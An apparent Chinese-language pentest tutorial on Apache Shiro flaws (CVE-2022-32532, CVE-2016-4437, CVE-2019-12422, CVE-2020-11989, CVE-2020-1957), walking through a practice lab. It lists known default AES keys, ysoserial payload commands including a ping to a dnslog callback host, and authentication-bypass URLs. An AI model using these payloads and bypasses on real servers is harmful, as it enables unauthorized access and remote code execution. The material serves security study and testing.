Shiro是JAVA安全框架，能够用于身份验证，授权，加密和会话管理

配置文件：ShiroConfig，在shiro中anon代表无需授权可以访问，authc代表需要授权可以访问

### RegExPatternMatcher 权限绕过（CVE-2022-32532）

##### 版本

Apache Shiro < 1.9.1

##### 利用

登录/permit/any页面，有两种方式无需验证直接登录

1.添加Token:

`token:4ra1n`

![img](https://i-blog.csdnimg.cn/blog_migrate/4b454e7e8cc5652a23a9859da740b2d1.png)

2.%0绕过

`/permit/a%0any`

![img](https://i-blog.csdnimg.cn/blog_migrate/d263a331776c910af33f8012ca218f94.png)

### 550反序列化漏洞(CVE-2016-4437)漏洞

##### 版本

Apache Shiro <= 1.2.4

##### 原理

1.AES加密需要秘钥

公开秘钥

```
kPH+bIxk5D2deZiIxcaaaA==
wGiHplamyXlVB11UXWol8g==
2AvVhdsgUs0FSA3SDFAdag==
4AvVhmFLUs0KTA3Kprsdag==
fCq+/xW488hMTCD+cmJ3aQ==
3AvVhmFLUs0KTA3Kprsdag==
1QWLxg+NYmxraMoxAXu/Iw==
ZUdsaGJuSmxibVI2ZHc9PQ==
Z3VucwAAAAAAAAAAAAAAAA==
U3ByaW5nQmxhZGUAAAAAAA==
6ZmI6I2j5Y+R5aSn5ZOlAA==
```

2**.shiro提供remeberMe功能，当用户账户密码正确时，若勾起了rememberMe功能，那么返回的数据包里就会包含`rememberMe=deleteMe` 字段，还会有 rememberMe 字段。**

**之后的所有请求中 Cookie 都会有 rememberMe 字段**

![img](https://img2024.cnblogs.com/blog/1265539/202412/1265539-20241225104148053-162402203.png)

3.r**ememberMe客户端的流程为:**

**序列化用户对象，对序列化后的数据进行AES加密，然后进行base64编码，最后在塞到cookie里【在AES加密阶段，用户如果没有自定义新的秘钥，就会是上面常见的秘钥库中的一个】**

**shiro服务端流程：1.读取cookie中的rememberMe的值，然后进行base64解码.接着再AES解密，最后反序列化**

4.我们对shiro服务端进行代码分析

[Shiro550漏洞(CVE-2016-4437) - yingzui - 博客园](https://www.cnblogs.com/yingzui/p/18629621)

传入cookie,当接受到cookie值时，执行getRememberedSerializedIdentity()方法，此时会把请求数据包中的cookie值通过getcookie()方法传给base64变量，

此时base64变量会被判断是否为`deleteme`字段，如果是，则getRememberedSerializedIdentity()方法返回空，如果不是，判断base64变量是否为空，不为空，则通过ensurePadding()方法和Base64.decode()对cookie值进行base64解密，解密后把cookie值传给bytes变量

接着会执行convertBytesToPrincipals()方法，把bytes里的cookie值进行AES解密然后再进行反序列化

【AES解密用到decrypt()方法，decrypt()方法又用到了getDecryptionCipherKey()方法，getDecryptionCipherKey()方法返回decryptionCipherKey变量，decryptionCipherKey变量中存储着秘钥（AbstractRememberMeManager()方法中设置的）】

5.从上面的分析我们可以得出，**shiro服务端只要接受到非空且不是deletmme字段的cookie就会执行base64解码+AES解密+反序列化，不需要登录，所以可以直接在登录框注入恶意cookie即可**

##### 利用

1.判断是否存在漏洞：

访问靶场：http://ip:8080/，勾选remember me，随便输入账号密码，使用burp抓包。

若返回包存在rememberMe=deleteMe字段，说明存在该漏洞

![img](https://i-blog.csdnimg.cn/blog_migrate/f9701b4a26646b892036f6820f78364c.png)

2.使用反序列化工具ysoserial

https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

执行命令：

```
java -jar ysoserial-master.jar CommonsBeanutils1 "touch /tmp/succ123" > poc.ser
```

4.再使用前面创建的poc.ser生成payload

执行命令：

```
python3 poc.py
```

![img](https://i-blog.csdnimg.cn/blog_migrate/523f26b02dda52377c757b4eca1d8482.png)

5.把payload放到请求包的cookie中，发送执行命令

记着 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。

![img](https://i-blog.csdnimg.cn/blog_migrate/0d355d8ed933c5d04891dd5b8875b29b.png)

### 721反序列化漏洞（CVE-2019-12422）

##### 版本

shiro < 1.4.2

##### 原理

**shiro解决了密钥硬编码问题后，使用了`AES-CBC`加密方式，该解密可以被加密能够被Padding Oracle Attack，不用找到密钥就能够直接修改rememberMe字段**

**但是需要通过已知 RememberMe 密文 使用 Padding Oracle Attack 一点点`爆破`来达到篡改和构造恶意的反序列化密文来触发反序列化漏洞。**

Padding Oracle攻击可以在没有密钥的情况下加密或解密密文

##### 利用

1.账户密码正确直接获取返回的rememberMe字段中的cookie值

2.使用Java反序列化工具 ysoserial 生成 Payload

```
java -jar ysoserial.jar CommonsBeanutils1 "ping 9ck71c.dnslog.cn" > payload.class
```

3.通过 Padding Oracle Attack 生成 Evil Rememberme cookie：
https://github.com/inspiringz/Shiro-721 # 暴破AES密钥的脚本

![在这里插入图片描述](https://img2024.cnblogs.com/blog/3392862/202410/3392862-20241007000922528-30025705.png)

4.漫长等待后，拿到pad数据后直接丢到cookie上面

或者用其他工具也行

### 权限绕过CVE-2020-11989

##### 版本

shiro < 1.5.3

##### 利用

1.在 URL 中插入 *;/*，例如：

http://localhost:8088/;/test/admin/page，最后就会解析到test/admin/page路径

2.使用双重编码的方式，例如：

http://localhost:8081/test/admin/a%25%32%66a，Shiro 在处理该请求时，会进行两次解码，得到 *admin/a/a

```
/ -> %2f ->%25%32%66
```

[Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989) - 腾讯安全玄武实验室](https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/)

### 权限绕过CVE-2020-1957

##### 版本

Apache Shiro < 1.5.1

##### 原理：

- 客户端请求URL: `/xxx/..;/admin/`
- Shrio 内部处理得到校验URL为 `/xxxx/..`,校验通过
- SpringBoot 处理 `/xxx/..;/admin/` , 最终请求 `/admin/`, 成功访问了后台请求。

##### 利用

构造恶意请求`/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面。